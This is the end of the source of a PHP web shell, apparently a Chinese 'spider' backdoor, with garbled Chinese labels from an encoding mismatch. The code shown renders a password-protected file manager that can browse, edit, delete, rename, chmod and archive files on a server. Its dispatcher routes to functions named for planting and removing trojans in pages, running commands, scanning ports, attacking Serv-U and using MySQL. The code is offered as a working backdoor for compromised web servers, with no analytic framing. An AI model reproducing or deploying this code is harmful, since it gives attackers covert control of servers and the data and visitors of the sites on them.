	<td class="toptd" style="width:200px;"> �޸�ʱ�� </td>
	<td class="toptd" style="width:100px;"> ��С </td></tr>
END;
	if(($h_d = @opendir($p)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(is_dir($Filepath))
		{
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filepath = urlencode($Filepath);
			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'&verifycode='.$password.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
			$Filename = urlencode($Filename);
			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> ɾ�� </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> ���� </a> </td> ';
			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td> </td> </tr>'."\r\n";
			$NUM_D++;
		}
	}
	@rewinddir($h_d);
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(!is_dir($Filepath))
		{
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath);
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filesize = File_Size(@filesize($Filepath));
			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'&verifycode='.$password.'"> �༭ </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> ���� </a> </td>';
			echo ' <td>'.$Fileperm.'</td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
			$NUM_F++;
		}
	}
	@closedir($h_d);
	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="����" onclick="SubmitUrl('������ѡ�ļ���·��: ','{$THIS_DIR}','a');return false;"> 
<input type="button" value="ɾ��" onclick="Delok('��ѡ�ļ�','b');return false;"> 
<input type="button" value="����" onclick="SubmitUrl('�޸���ѡ�ļ�����ֵΪ: ','0666','c');return false;"> 
<input type="button" value="ʱ��" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="���" onclick="SubmitUrl('�����������ѡ�ļ�������Ϊ: ','spider.tar.gz','e');return false;"> 
Ŀ¼({$NUM_D}) / �ļ�({$NUM_F})</div> 
</form> 
END;
	return true;
}

function Root_Login($MSG_TOP)
{
print<<<END
<html>
	<body style="background:#AAAAAA;">
		<center>
		<form method="POST">
		<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">PASS:<input type="password" name="spiderpass" style="width:270px;"></div>
		<div style="width:350px;height:30px;clear:both;"><input type="submit" value="LOGIN" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
</html>
END;
	return false;
}

function WinMain($password)
{	
	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
	$Server_OS = PHP_OS;
	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
	$Server_Alexa = 'http://cn.alexa.com/siteinfo/'.str_replace('www.','',$_SERVER['SERVER_NAME']);
print<<<END
<html>
	<title> ��վ����ϵͳ </title>
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "����",sans-serif; font-size:13px; text-align:center;margin-top:5px;word-break:break-all;}
			a{color:#FFFFFF;text-decoration:none;}
			a:hover{background:#BBBBBB;}
			.outtable {margin: 0 auto;height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
			.topbg {padding-top:3px;text-align: left;font-size:12px;font-weight: bold;height:22px;width:950px;color:#FFFFFF;background: #293F5F;}
			.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
			.listbg {font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
			.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
			.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
		</style>
		<script language="JavaScript">
			function switchTab(tabid)
			{
				if(tabid == '') return false;
				for(var i=0;i<=14;i++)
				{
					if(tabid == 't_'+i) document.getElementById(tabid).style.background="#FFFFFF";
					else document.getElementById('t_'+i).style.background="#BBBBBB";
				}
				return true;
			}
		</script>
	</head>
	<body>
		<div class="outtable">
		<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS}-��վ����ϵͳ</div>
			<div style="height:546px;">
				<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
				<tr>				
				<td>
				<iframe name="main" src="?s=a&verifycode=$password" width="100%" height="100%" frameborder="0"></iframe>
				</td>
				</tr>
				</table>
			</div>
		<div class="bottombg"> {$Server_Soft} </div>
		</div>
	</body>
</html>
END;
return false;
}

if(get_magic_quotes_gpc())
{
	$_GET = Root_GP($_GET);
	$_POST = Root_GP($_POST);
}
if($_GET['s'] == 'logout')
{
	setcookie('admin_spiderpass',NULL);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

if(isset($_GET['s']))
{	
	$s = $_GET['s'];
	if($s != 'a' && $s != 'n')
	Root_CSS();
}

//...��վ��Ŀ¼
$siteroot = dirname(dirname(__FILE__));
$p = isset($_GET['p']) ? $_GET['p'] : File_Str($siteroot);


switch($s)
{
	case "a" : File_a($p,$password); break;
	case "b" : Guama_b(); break;
	case "c" : Qingma_c(); break;
	case "d" : Tihuan_d(); break;
	case "e" : Antivirus_e(); break;
	case "f" : Info_f(); break;
	case "g" : Exec_g(); break;
	case "h" : Com_h(); break;
	case "i" : Port_i(); break;
	case "j" : Findfile_j(); break;
	case "k" : Linux_k(); break;
	case "l" : Servu_l(); break;
	case "m" : Mysql_m(); break;
	case "n" : Mysql_n(); break;
	case "o" : Mysql_o(); break;
	case "p" : File_Edit($_GET['fp'],$_GET['fn'],'',$password); break;
	case "q" : File_Soup($p,$password); break;
	case "r" : Mysql_Msg(); break;
	default: WinMain($password); break;
}

?>
